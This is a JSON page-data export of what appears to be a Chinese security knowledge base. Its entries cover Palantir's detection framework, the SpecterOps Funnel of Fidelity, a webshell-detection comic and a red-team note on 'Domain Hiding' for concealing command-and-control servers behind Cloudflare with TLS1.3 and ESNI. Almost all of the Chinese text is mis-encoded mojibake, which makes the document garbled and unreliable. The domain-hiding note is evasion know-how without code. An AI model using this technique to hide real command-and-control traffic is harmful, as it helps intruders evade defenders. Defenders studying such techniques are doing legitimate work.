æ˜¯å¦è¿›è¡Œäº†ä»»ä½•å¯ç–‘çš„æ–‡ä»¶ä¿®æ”¹ï¼Ÿå¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶ä¸å¯ä¿¡ï¼Œæˆ–æ— æ³•è¿½è¸ªåˆ°åˆæ³•å®‰è£…çš„åº”ç”¨ç¨‹åºï¼Œå°†å…¶è§†ä¸ºæ½œåœ¨å±å®³å¹¶å‡çº§ä¸ºå®‰å…¨äº‹ä»¶ã€‚\r\n- **å…¶ä»–èµ„æº**\r\n  - https://github.com/Mr-Un1k0d3r/PowerLessShell\r\n  - https://github.com/leechristensen/UnmanagedPowerShell\r\n  - https://www.blackfog.com/fileless-powershell-protection/\r\n\r\n# 4. æ€è€ƒ\r\n- å¦‚ä½•æ„å»ºå¥½çš„å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿé¦–å…ˆï¼Œ**ç›®æ ‡åº”è¯¥æ˜ç¡®**ï¼Œæ¨¡ç³Šçš„çš„ç›®æ ‡ä¼šå¯¼è‡´æ— æ³•è½åœ°æ‰§è¡Œï¼›å…¶æ¬¡æ˜¯è¦**åšå‡ºä¸€äº›å‡è®¾**ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¯èƒ½æŒæ¡æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™ä¸ªä¸–ç•Œå……æ»¡äº†ä¸ç¡®å®šæ€§ï¼Œå½“é¢å¯¹ä¸ç¡®å®šæ€§æ—¶ï¼Œå¿…é¡»é€šè¿‡å‡è®¾ï¼Œæ¥ä¸æ–­è¯ä¼ªå’Œä¿®æ­£ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³æ£€æµ‹CoblatStrikeï¼Œæ˜¯æ£€æµ‹beaconè¿˜æ˜¯å®ƒæ‰§è¡Œçš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªåŠŸèƒ½å‘¢ï¼Ÿæ˜¯å¦è¦è€ƒè™‘åœ¨ä¸åŒç¯å¢ƒã€ä¸åŒç‰ˆæœ¬ã€ä¸åŒç½‘ç»œæ¶æ„çš„åŒºåˆ«ï¼Ÿåœ¨ç»ˆç«¯å±‚ã€ç½‘ç»œå±‚ã€èº«ä»½è®¤è¯æ•°æ®ç­‰ä¸åŒæ£€æµ‹ç»´åº¦ä¸‹ï¼Œåˆ†åˆ«è¯¥å¦‚ä½•æ£€æµ‹å’Œè”åŠ¨ï¼Ÿç­‰ç­‰è¿™äº›é—®é¢˜éƒ½éœ€è¦åœ¨ä¸€ä¸ªä¸ªçš„å‡è®¾ä¸‹å»å®Œæˆã€‚æœ€åæ˜¯**ä¸Šä¸‹æ–‡ä¿¡æ¯**ï¼Œå½“æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªè­¦å‘Šæ—¶ï¼Œä»æ ‡é¢˜å’Œå†…å®¹å¹¶ä¸çŸ¥é“å®ƒæ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ã€å®ƒçš„æ£€æµ‹æœºåˆ¶æ˜¯æ€æ ·çš„ã€åº”è¯¥ç”¨å®ƒåšä»€ä¹ˆï¼Ÿ\r\n- Palantirçš„å¨èƒæ£€æµ‹æ¡†æ¶åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šåœ¨å°è¯•è§£å†³ä¸Šè¿°çš„é—®é¢˜ï¼Œå½“ç„¶ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¦»ä¸å¼€ä¸“å®¶çŸ¥è¯†ã€äººå·¥å¤„ç½®ã€è¶³å¤Ÿå…¨çš„æ•°æ®å’Œè‡ªåŠ¨åŒ–æ“ä½œç­‰ã€‚\r\n\r\n# 5. å‚è€ƒèµ„æ–™\r\n- [https://blog.palantir.com/alerting-and-detection-strategy-framework-52dc33722df2](https://blog.palantir.com/alerting-and-detection-strategy-framework-52dc33722df2)\r\n- [https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell](https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell)\r\n- [https://cloud.withgoogle.com/cloudsecurity/podcast](https://cloud.withgoogle.com/cloudsecurity/podcast)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ£€æµ‹å·¥ç¨‹/å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”SpecterOpsæ¼æ–—æ¨¡å‹ä»‹ç»/","title":"å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ£€æµ‹å·¥ç¨‹\r\n- å¨èƒæ£€æµ‹\r\n- SpecterOps\r\n- æ¡†æ¶\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nSpecterOpsåœ¨ä¸å®¢æˆ·åˆä½œæ„å»ºå¨èƒæ£€æµ‹å’Œå“åº”èƒ½åŠ›çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°ä¸¤ä¸ªç—›ç‚¹é—®é¢˜ï¼š1ã€äººåŠ›æœ‰é™ï¼Œæ— æ³•å“åº”æ¯ä¸€ä¸ªå®‰å…¨äº‹ä»¶ï¼›2ã€æ£€æµ‹å“åº”æµç¨‹ä¸­ç†æƒ³ä¸ç°å®çš„è„±èŠ‚ã€‚å› æ­¤å‘æ˜äº†æ¼æ–—æ¨¡å‹(Funnel of Fidelity)ï¼Œé‡åŒ–äº†åœ¨ä¸åŒé˜¶æ®µï¼Œä¸åŒè§’è‰²æ‰€æ‹…ä»»çš„èŒè´£æ˜¯ä»€ä¹ˆã€‚éšç€æ¨¡å‹ä»å·¦åˆ°å³å±‚å±‚è¿‡æ»¤ï¼Œå®‰å…¨äº‹ä»¶åˆ†æçš„æ·±åº¦å’ŒçœŸå®åº¦ä¼šé€æ­¥å¢åŠ ã€‚\r\n\r\n# 2. æ¼æ–—æ¨¡å‹\r\nåœ¨å¨èƒæ£€æµ‹å’Œå“åº”ä¸­ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¦‚ä½•é«˜æ•ˆåˆ©ç”¨æœ‰é™çš„èµ„æºæ¥è¾¾æˆç›®çš„ï¼Œå› æ­¤éœ€è¦è¿‡æ»¤æ‰æ— ç”¨çš„ä¿¡æ¯ï¼ŒæŠŠæ³¨æ„åŠ›é›†ä¸­çš„å¤§æ¦‚ç‡ä¸ºçœŸçš„å®‰å…¨äº‹ä»¶ä¸Šã€‚æ¼æ–—æ¨¡å‹åŒ…å«äº†æ•°æ®æ”¶é›†ã€å¨èƒæ£€æµ‹ã€å®‰å…¨åˆ†æã€äº‹ä»¶è°ƒæŸ¥å’Œä¿®å¤ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æ˜¯æ£€æµ‹å’Œå“åº”ç¨‹åºçš„å…³é”®ç»„æˆéƒ¨åˆ†ï¼Œå¦‚æœåªé‡ç‚¹å…³æ³¨/å¿½è§†æŸäº›é˜¶æ®µï¼Œåˆ™ä¼šå¯¼è‡´æ¼æ–—çš„æµåŠ¨å‡ºç°é—®é¢˜ï¼Œå¦‚ï¼š\r\n\r\n- æ²¡æœ‰æ”¶é›†ç®¡æ§é¥æµ‹æ•°æ®çš„SIEM/SOCå¹³å°ï¼Œæˆ–æ”¶é›†ä¸å…¨ã€è¦†ç›–ä¸è¶³ã€è§£æä¸å¤Ÿ\r\n- å¨èƒæ£€æµ‹èƒ½åŠ›ä¸è¶³ï¼Œæ— æ³•æœ‰æ•ˆäº§ç”Ÿå¯ä»¥ç”¨æ¥è°ƒæŸ¥çš„å®‰å…¨å‘Šè­¦\r\n- æ²¡æœ‰è¶³å¤Ÿçš„å®‰å…¨äº‹ä»¶å“åº”è®¡åˆ’å’Œæ¼”ä¹ ï¼Œè™½ç„¶å¯ä»¥æ£€æµ‹åˆ°æ”»å‡»ï¼Œä½†æ— æ³•ä»¥å¯é çš„æ–¹å¼å¯¹å…¶è¿›è¡Œè¡¥æ•‘\r\n\r\nä¸‹é¢æ˜¯æ¼æ–—æ¨¡å‹çš„å¯è§†åŒ–è¡¨ç¤ºï¼Œå°†ç®­å¤´çš„å¤§å°æƒ³è±¡ä¸ºæ¯ä¸ªé˜¶æ®µå¿…é¡»å¤„ç†çš„è¾“å…¥æ•°é‡ã€‚è¿‡æ»¤å‘ç”Ÿåœ¨æ¯ä¸ªå½©è‰²ç¯ä¸Šï¼Œä»¥å‡å°‘ä¼ é€’åˆ°æµç¨‹ä¸‹ä¸€æ­¥çš„é€šç”¨äº‹ä»¶çš„é‡çº§ã€‚\r\n\r\n- ![pEk7pn](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/pEk7pn.jpg)\r\n- æ¼æ–—æ¨¡å‹ç”±äº”ä¸ªé˜¶æ®µç»„æˆï¼šæ•°æ®æ”¶é›†ã€å¨èƒæ£€æµ‹ã€å®‰å…¨åˆ†æã€äº‹ä»¶è°ƒæŸ¥å’Œä¿®å¤ã€‚æ¯ä¸ªé˜¶æ®µé‡‡ç”¨å‰ä¸€é˜¶æ®µç”Ÿæˆçš„è¾“å…¥ï¼Œæ‰§è¡ŒæŸç§è¿‡æ»¤æˆ–é™å™ªï¼Œå¹¶ä¸ºä¸‹ä¸€ä¸ªé˜¶æ®µç”Ÿæˆè¾“å‡ºã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½å…è®¸å¯¹ç›¸å…³äº‹ä»¶è¿›è¡Œæ›´æ·±å…¥æˆ–æ›´å¤šçš„æ‰‹åŠ¨åˆ†æï¼Œå› ä¸ºä¸ç›¸å…³çš„äº‹ä»¶éƒ½ä¼šè¢«è¿‡æ»¤æ‰ã€‚ä¸‹é¢ä¼šæ·±å…¥è®²ä¸€è®²å„ä¸ªé˜¶æ®µï¼ŒåŒ…æ‹¬äº†è´Ÿè´£çš„è§’è‰²ã€è¾“å…¥å’Œè¾“å‡ºã€‚\r\n\r\n**é˜¶æ®µä¸€ï¼šæ—¥å¿—æ”¶é›†**\r\n\r\n- è§’è‰²ï¼šæ•°æ®å·¥ç¨‹å¸ˆ\r\n- è¾“å…¥ï¼šæ¢é’ˆ/Agentç­‰Sensor\r\n- è¾“å‡ºï¼šäº‹ä»¶\r\n- æ—¥å¿—æ”¶é›†æ˜¯å¨èƒæ£€æµ‹å’Œå“åº”è¿‡ç¨‹ä¸­æœ€åŸºç¡€çš„éƒ¨åˆ†ï¼Œæä¾›äº†æœ‰å…³æ•´ä¸ªç¯å¢ƒä¸­å‘ç”Ÿçš„æ´»åŠ¨çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚å¦‚æœæ²¡æœ‰æ•°æ®ï¼Œå‡ ä¹ä¸å¯èƒ½æ£€æµ‹åˆ°æ¶æ„æ´»åŠ¨ã€‚æˆç†Ÿçš„å®‰å…¨å›¢é˜Ÿåº”è¯¥åº”åŠªåŠ›é›†ä¸­å°½å¯èƒ½å¤šçš„é¥æµ‹æ•°æ®ï¼Œä»¥æ”¯æŒåç»­çš„æ£€æµ‹å’Œå“åº”ã€‚ä¾‹å¦‚ï¼ŒWindows äº‹ä»¶æ—¥å¿—åœ¨æœ¬åœ°ç”Ÿæˆå’Œå­˜å‚¨ï¼Œä½†å¿…é¡»è¿›è¡Œè½¬å‘æ”¶é›†æ‰èƒ½å‘æŒ¥ä»·å€¼ã€‚\r\n\r\n**é˜¶æ®µäºŒï¼šå¨èƒæ£€æµ‹**\r\n\r\n- è§’è‰²ï¼šæ£€æµ‹å·¥ç¨‹å¸ˆ\r\n- è¾“å…¥ï¼šäº‹ä»¶\r\n- è¾“å‡ºï¼šå®‰å…¨å‘Šè­¦\r\n- é€šè¿‡é›†ä¸­ç›¸å…³äº‹ä»¶ï¼Œæ£€æµ‹å·¥ç¨‹å¸ˆå®šä¹‰æ£€æµ‹é€»è¾‘æ¥è¯†åˆ«ä¸å®‰å…¨å¨èƒç›¸å…³çš„äº‹ä»¶ã€‚æ£€æµ‹é˜¶æ®µçš„ç›®æ ‡æ˜¯å°†æ—¥å¿—æ”¶é›†é˜¶æ®µçš„æ•°ç™¾ä¸‡ä¹ƒè‡³æ•°äº¿çš„äº‹ä»¶å‡å°‘åˆ°æ•°ç™¾ç”šè‡³æ•°åƒä¸ªå®‰å…¨å‘Šè­¦ï¼Œè¿™äº›å‘Šè­¦å°†åœ¨åˆ†æé˜¶æ®µè¿›è¡Œåˆ†æã€‚è¿™äº›æ£€æµ‹æ–¹æ³•é€šå¸¸æ˜¯å·¥ç¨‹å¸ˆåœ¨å’Œå®‰å…¨äº‹ä»¶/æ¼æ´çš„äº¤äº’è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ï¼Œå¹¶é€šè¿‡ç¨‹åºè‡ªåŠ¨åŒ–çš„æ–¹å¼éƒ¨ç½²ï¼Œä»¥ç”Ÿæˆå®‰å…¨å‘Šè­¦ã€‚\r\n\r\n**é˜¶æ®µä¸‰ï¼šå®‰å…¨åˆ†æ**\r\n\r\n- è§’è‰²ï¼šå®‰å…¨åˆ†æå¸ˆ\r\n- è¾“å…¥ï¼šå®‰å…¨å‘Šè­¦\r\n- è¾“å‡ºï¼šå®‰å…¨äº‹ä»¶æˆ–è€…çº¿ç´¢\r\n- å®‰å…¨å‘Šè­¦æ˜¯æ£€æµ‹é€»è¾‘çš„äº§å‡ºç‰©ï¼Œæœ‰ä¸€å®šæ•°é‡çš„è¯¯æŠ¥æ˜¯åˆç†çš„ã€‚åœ¨å®‰å…¨åˆ†æé˜¶æ®µï¼Œå®‰å…¨åˆ†æå¸ˆå°†å‘Šè­¦åˆ†ç±»ä¸ºæ¶æ„ã€æ­£å¸¸å’ŒæœªçŸ¥ï¼›æ¶æ„å‘Šè­¦ä¼šè¢«æ ‡è¯†ä¸ºå®‰å…¨äº‹ä»¶ï¼Œå¹¶å‘é€åˆ°é˜¶æ®µå››è¿›è¡Œå“åº”å¤„ç½®ï¼Œè€ŒæœªçŸ¥å‘Šè­¦åˆ™è¢«æ ‡è¯†ä¸ºçº¿ç´¢ï¼Œå¹¶å‘é€åˆ°äº‹ä»¶è°ƒæŸ¥é˜¶æ®µï¼Œå› ä¸ºå®ƒéœ€è¦é¢å¤–çš„å®¡æŸ¥ã€‚\r\n- è¿™ä¸€é˜¶æ®µé€šå¸¸èƒ½éš¾å®ç°è‡ªåŠ¨åŒ–è¯†åˆ«ï¼Œéœ€è¦äººå·¥ä»‹å…¥åˆ†æï¼Œä½†è¿™å°±æ„å‘³ç€èƒ½åŠ›ã€ç»éªŒã€ä¸Šä¸‹æ–‡ä¿¡æ¯çš„ä¸è¶³ä¼šå¯¼è‡´åˆ†æè¿‡ç¨‹éš¾ä»¥æ ‡å‡†åŒ–ã€‚èƒ½åŠ›å’Œç»éªŒéœ€è¦æ‹›è˜ä¼˜ç§€çš„äººæ‰ï¼Œå¹¶æŒç»­å­¦ä¹ åŸ¹å…»ï¼›è€Œä¸Šä¸‹æ–‡ä¿¡æ¯ä¸è¶³ä¼šä½¿åˆ†æå¸ˆå¾ˆéš¾ç†è§£æ”»å‡»çš„èƒŒæ™¯ä¿¡æ¯ã€äº§ç”Ÿå‘Šè­¦çš„æ£€æµ‹é€»è¾‘ã€å®Œæ•´çš„æ”»å‡»é“¾æ¡ä»¥åŠåº”è¯¥å¦‚ä½•è¯†åˆ«æ¶æ„å’Œæ­£å¸¸ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨æœ‰å®Œå¤‡ä¿¡æ¯çš„å¨èƒæ£€æµ‹æ¡†æ¶ï¼ˆå¦‚ [[å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»]] ï¼‰æ¥ç¼“è§£è¿™äº›é—®é¢˜ã€‚\r\n\r\n**é˜¶æ®µå››ï¼šäº‹ä»¶è°ƒæŸ¥**\r\n\r\n- è§’è‰²ï¼šå®‰å…¨åˆ†æå¸ˆ\r\n- è¾“å…¥ï¼šçº¿ç´¢\r\n- è¾“å‡ºï¼šå®‰å…¨äº‹ä»¶\r\n- å®‰å…¨åˆ†æé˜¶æ®µç”¨äºæ¶ˆé™¤è¯¯æŠ¥ï¼Œå¹¶äº§ç”Ÿå¯æ§æ•°é‡çš„æœªçŸ¥äº‹ä»¶ï¼ˆå¯èƒ½ä¸ºä¸ªä½æ•°æˆ–ä¸¤ä½æ•°ï¼‰ã€‚è°ƒæŸ¥é˜¶æ®µç”¨äºæ”¶é›†åœ¨æ£€æµ‹æˆ–åˆ†æé˜¶æ®µå¯èƒ½ä¸å¯ç”¨çš„å…¶ä»–ä¸Šä¸‹æ–‡ã€‚è¿™å¯èƒ½æ¶‰åŠæ›´å¤šæ‰‹åŠ¨å’Œå¯æ‰©å±•æ€§è¾ƒä½çš„åˆ†æï¼Œä¾‹å¦‚æ–‡ä»¶ç³»ç»Ÿåˆ†æã€å†…å­˜å–è¯ã€äºŒè¿›åˆ¶åˆ†æç­‰ï¼Œä»¥å¸®åŠ©è¯†åˆ«å®‰å…¨äº‹ä»¶çš„çœŸæ­£ç›®çš„ã€‚ç”±äºå‰å‡ ä¸ªé˜¶æ®µå‘ç”Ÿçš„å™ªéŸ³å‡å°‘ï¼Œå› æ­¤å¯ä»¥æœ‰è¶³å¤Ÿçš„äººåŠ›è¿›è¡Œè¿™ç§é¢å¤–çš„å®¡æŸ¥ã€‚\r\n\r\n**é˜¶æ®µäº”ï¼šä¿®å¤**\r\n\r\n- è§’è‰²ï¼šåº”æ€¥å“åº”å·¥ç¨‹å¸ˆ\r\n- è¾“å…¥ï¼šå®‰å…¨äº‹ä»¶\r\n- è¾“å‡ºï¼šN/A\r\n- ä¸€æ—¦ç¡®è®¤å‘ç”Ÿå®‰å…¨äº‹ä»¶ï¼Œå°±å¿…é¡»å¼€å±•è¡¥æ•‘æ´»åŠ¨ã€‚åœ¨æ­¤é˜¶æ®µï¼Œåº”æ€¥å“åº”å·¥ç¨‹å¸ˆä¼šç¡®å®šå®‰å…¨äº‹ä»¶çš„èŒƒå›´å¹¶ä»ç³»ç»Ÿå’Œç½‘ç»œä¸­æ¶ˆé™¤å½±å“ã€‚è®¸å¤šç»„ç»‡ä¼šä¸ç¬¬ä¸‰æ–¹åˆä½œå®Œæˆè¡¥æ•‘æ´»åŠ¨å¹¶ç¡®ä¿å®ƒä»¬åŠæ—¶å®Œæˆã€‚\r\n\r\n# 3. ä»€ä¹ˆæ˜¯å¨èƒæ£€æµ‹ï¼Ÿ\r\nåœ¨è®¸å¤šç»„ç»‡ä¸­ï¼Œæ£€æµ‹çš„æ¦‚å¿µå¾€å¾€éå¸¸å¾®å¦™ã€‚å‡ºäºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬å¿…é¡»åŒºåˆ†å¾®è§‚çš„æ£€æµ‹ï¼ˆç¼–å†™æ£€æµ‹é€»è¾‘ä»¥å‘ç°æ½œåœ¨æ¶æ„äº‹ä»¶çš„è¿‡ç¨‹ï¼‰å’Œå®è§‚çš„æ£€æµ‹ï¼ˆä»å‘Šè­¦åˆ°è¡¥æ•‘çš„è¿‡ç¨‹ï¼‰ã€‚ä»å®è§‚æ„ä¹‰ä¸Šè®²ï¼Œæ”»å‡»å¿…é¡»å¯¼è‡´æŸç§è¡¥æ•‘æ´»åŠ¨ï¼Œå¦åˆ™éƒ½è¢«è®¤ä¸ºæ˜¯è¢«åŠ¨æ£€æµ‹è€Œå·²ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬å°†æ¢è®¨ä¸¤ä¸ªå…³äºæ£€æµ‹æ¦‚å¿µæ··æ·†çš„æ¡ˆä¾‹ã€‚\r\n- **case 1**\r\n  - åœ¨æ”»é˜²å¯¹æŠ—æ¼”ç»ƒè¿‡ç¨‹ä¸­ï¼Œé˜²å®ˆæ–¹åœ¨SIEM/SOCå‘ç°äº†æ”»å‡»æ–¹çš„ç›¸å…³äº‹ä»¶ï¼Œç„¶åå°±å®£å¸ƒï¼šâ€œæˆ‘ä»¬æˆåŠŸæŠ“åˆ°äº†æ”»å‡»æ–¹ï¼â€ã€‚ä½†å…¶å®ä»–ä»¬è™½ç„¶æ”¶é›†äº†ä¸è¯¥æ”»å‡»ç›¸å…³çš„ä¿¡æ¯ï¼Œä½†å°šæœªåˆ›å»ºæ£€æµ‹é€»è¾‘æ¥æ£€æµ‹è¯¥æ´»åŠ¨ã€‚è¿™ä¸èƒ½ç®—æ˜¯æœ‰æ•ˆçš„å¨èƒæ£€æµ‹ã€‚\r\n- **case 2**\r\n  - åœ¨æ”»é˜²å¯¹æŠ—æ¼”ç»ƒè¿‡ç¨‹ä¸­ï¼Œé˜²å®ˆæ–¹å·²ç»å¯¹ç‰¹å®šçš„æ”»å‡»æŠ€æœ¯æ„å»ºäº†æ£€æµ‹é€»è¾‘ï¼Œå¦‚Kerberoastingï¼Œè™½ç„¶è§¦å‘äº†å®‰å…¨å‘Šè­¦ï¼Œä½†å®‰å…¨åˆ†æå¸ˆå¯¹ Kerberoasting çš„äº†è§£ä¸å¤Ÿï¼Œæ— æ³•åŒºåˆ†ä¸­æ­£å¸¸è¯·æ±‚å’Œæ¶æ„æ”»å‡»ã€‚è™½ç„¶åœ¨å¾®è§‚ä¸Šç¡®å®æ£€æµ‹åˆ°äº†æ”»å‡»ï¼Œä½†åœ¨å®è§‚ä¸Šï¼Œè¿™å¹¶ä¸æ˜¯æœ‰æ•ˆçš„å¨èƒæ£€æµ‹ã€‚\r\n- **æ€»ç»“**\r\n  - æ¼æ–—æ¨¡å‹çš„ä¸€ä¸ªå·¨å¤§å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥è¯Šæ–­æ•…éšœå‘ç”Ÿåœ¨å“ªä¸ªé˜¶æ®µï¼Œåœ¨case 1ä¸­ï¼Œä¼¼ä¹æœ‰è¶³å¤Ÿçš„æ—¥å¿—æ”¶é›†ï¼Œä½†ç¼ºå°‘å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨åœ¨å½“å‰ç¯å¢ƒä¸­æ”¶é›†çš„æ•°æ®ï¼Œæ¥è®¾è®¡å¯¹åº”çš„å¨èƒæ£€æµ‹çš„ç­–ç•¥ã€‚ åœ¨case 2ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ç³»ç»Ÿç”Ÿæˆäº†å®‰å…¨å‘Šè­¦ï¼Œä½†åœ¨åˆ†æé˜¶æ®µå¤±è´¥äº†ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä¸“æ³¨äºæ„å»ºå‘Šè­¦æ–‡æ¡£å’ŒåŸ¹è®­å¸®åŠ©åˆ†æå¸ˆå®Œæˆå·¥ä½œã€‚è¿™ä¸¤ä¸ªä¾‹å­éƒ½ä¸åº”è¢«è§†ä¸ºå¨èƒæ£€æµ‹å’Œå“åº”çš„å¤±è´¥ã€‚ç›¸åï¼Œå®ƒä»¬åº”è¯¥è¢«è§†ä¸ºæ”¹è¿›æ•´ä¸ªè¿‡ç¨‹çš„æœºä¼šã€‚\r\n\r\n# 4. å‚è€ƒèµ„æ–™\r\n- [https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036](https://posts.specterops.io/introducing-the-funnel-of-fidelity-b1bb59b04036)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»]: å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç».md \"å¦‚ä½•æå‡å¨èƒæ£€æµ‹èƒ½åŠ›ï¼Ÿâ€”â€”Palantirå¨èƒæ£€æµ‹æ¡†æ¶ä»‹ç»\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue Teamèƒ½åŠ›å»ºè®¾/æ–‡ä»¶åˆ†æ/é•¿äº­çš„webshellæ£€æµ‹æ¼«ç”»æŒºæœ‰æ„æ€/","title":"é•¿äº­çš„webshellæ£€æµ‹æ¼«ç”»æŒºæœ‰æ„æ€"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: é•¿äº­çš„webshellæ£€æµ‹æ¼«ç”»æŒºæœ‰æ„æ€\r\ntags:\r\n- Blue Teamèƒ½åŠ›å»ºè®¾\r\n- æ–‡ä»¶åˆ†æ\r\n- webshell\r\n- é•¿äº­\r\n---\r\n\r\n# 1. Webshellæ£€æµ‹èƒ½åŠ›è¿›åŒ–ç¬”è®°\r\n![MI9b1J](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/MI9b1J.jpg)\r\n![cQOAWO](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/cQOAWO.jpg)\r\n![l546Tq](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/l546Tq.jpg)\r\n![ttV8uD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ttV8uD.jpg)\r\n![ttV8uD](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ttV8uD.jpg)\r\n![mVvDs3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/mVvDs3.jpg)\r\n\r\n# 2. å‚è€ƒèµ„æ–™\r\n- [https://mp.weixin.qq.com/s/ehWF7ZAWv0gRi9U9Aacvfw](https://mp.weixin.qq.com/s/ehWF7ZAWv0gRi9U9Aacvfw)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Red Teamèƒ½åŠ›å»ºè®¾/å‘½ä»¤ä¸æ§åˆ¶ C2/åŸŸéšè— Domain Hiding/","title":"åŸŸéšè— Domain Hiding"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: åŸŸéšè— Domain Hiding\r\ntags:\r\n- Red Teamèƒ½åŠ›å»ºè®¾\r\n- å‘½ä»¤ä¸æ§åˆ¶ C2\r\n- Cloudflare\r\n---\r\n\r\n# èƒŒæ™¯\r\nåŸŸå‰ç½® Domain Fronting æŠ€æœ¯å·²ç»è¢«ä¸»æµçš„äº‘å‚å•†å°ç¦ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒErik Hunstadå‘æ˜äº†åŸŸéšè—Domain HidingæŠ€æœ¯ã€‚å®ƒèƒ½å®ç°åŸŸå‰ç½®éšè—çœŸå®åŸŸåçš„ç›®çš„ï¼ŒåŒæ—¶æ¯”åŸŸå‰ç½®æ›´çµæ´»ï¼Œåªéœ€è¦æŠŠåŸŸåDNSè§£ææ‰˜ç®¡åœ¨Cloudflareï¼Œè€Œä¸»æœºæœåŠ¡å™¨å¯ä»¥æ‰˜ç®¡åœ¨ä»»ä½•åœ°æ–¹ã€‚\r\n\r\n# TLS1.3+ESNI\r\nä½¿ç”¨å¸¦æœ‰ESNIï¼ˆåŠ å¯†çš„SNIï¼‰çš„TLS1.3è¯·æ±‚å‘é€åˆ°ä»»æ„CloudflareæœåŠ¡å™¨\r\n\r\nHTTPè¯·æ±‚çš„Hostå­—æ®µåŒ…å«éšè—çš„ç›®æ ‡åŸŸåï¼ˆDNSè§£ææ‰˜ç®¡åˆ°Cloudflareï¼‰\r\n\r\nCloudflareä¼šæŠŠè¯·æ±‚è½¬å‘åˆ°éšè—çš„ç›®æ ‡æœåŠ¡å™¨\r\n\r\n![omRIwK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/omRIwK.jpg)\r\n\r\n**ç›®å‰è¯¥æŠ€æœ¯ä¾èµ–Cloudflareï¼š**\r\n\r\n- 2020-08-10: Cloudflareå¼€å§‹æ‹’ç»åŒæ—¶åŒ…å«ESNI and SNIçš„ClientHelloæ•°æ®åŒ…\r\n- åŒ…å«ESNIçš„ClientHelloæ•°æ®åŒ…å¯ä»¥æ­£å¸¸è¯·æ±‚\r\n- å›½å†…æ— æ³•ä½¿ç”¨ï¼ŒåŸå› è§ï¼šhttps://geneva.cs.umd.edu/posts/china-censors-esni/esni/\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://github.com/Ridter/DomainHiding](https://github.com/Ridter/DomainHiding)\r\n- [https://docs.google.com/viewerng/viewer?url=https://media.defcon.org/DEF%2520CON%252028/DEF%2520CON%2520Safe%2520Mode%2520presentations/DEF%2520CON%2520Safe%2520Mode%2520-%2520Erik%2520Hunstad%2520-%2520Domain%2520Fronting%2520is%2520Dead%2520Long%2520Live%2520Domain%2520Fronting.pdf](https://docs.google.com/viewerng/viewer?url=https://media.defcon.org/DEF%2520CON%252028/DEF%2520CON%2520Safe%2520Mode%2520presentations/DEF%2520CON%2520Safe%2520Mode%2520-%2520Erik%2520Hunstad%2520-%2520Domain%2520Fronting%2520is%2520Dead%2520Long%2520Live%2520Domain%2520Fronting.pdf)"},{"fields":{"slug":"/å®‰å…¨